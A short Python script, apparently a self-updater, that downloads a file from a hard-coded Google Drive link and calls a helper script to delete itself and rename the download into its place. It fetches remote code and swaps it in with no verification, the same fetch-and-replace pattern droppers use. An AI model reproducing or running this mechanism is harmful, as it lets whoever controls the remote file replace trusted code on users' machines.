import requests
import os
import subprocess
import sys
#updated main file
def download_file(url, filename):
    # Get the current script directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    # Set the full path for the downloaded file
    file_path = os.path.join(script_dir, filename)

    # Send a GET request to the URL
    response = requests.get(url, stream=True)

    # Check if the request was successful
    if response.status_code == 200:
        # Open the file in write-binary mode and save the content
        with open(file_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        print(f"File '{filename}' downloaded successfully to '{file_path}'.")
        return file_path  # Return the full path of the downloaded file
    else:
        print(f"Failed to download file: {response.status_code}")
        return None

def convert_drive_link_to_download_url(file_id):
    return f"https://drive.google.com/uc?id={file_id}&export=download"

def get_file_id(drive_url):
    return drive_url.split('/d/')[1].split('/')[0]

if __name__ == "__main__":
    # Replace this URL with the file URL you want to download
    file_url = "https://drive.google.com/file/d/1y5HEX6QzTNUx7BYH2yWzopubtKhujqA-/view?usp=sharing"
    
    # Get the file ID from the URL
    file_id = get_file_id(file_url)
    
    # Create the download URL
    download_url = convert_drive_link_to_download_url(file_id)
    
    # Use a fallback filename
    filename = f"psi.file"
    
    # Download the file and get its path
    downloaded_file_path = download_file(download_url, filename)
    
    if downloaded_file_path:
        # Call the helper script to delete this script and rename the downloaded file
        subprocess.run([sys.executable, "helper.py", downloaded_file_path])
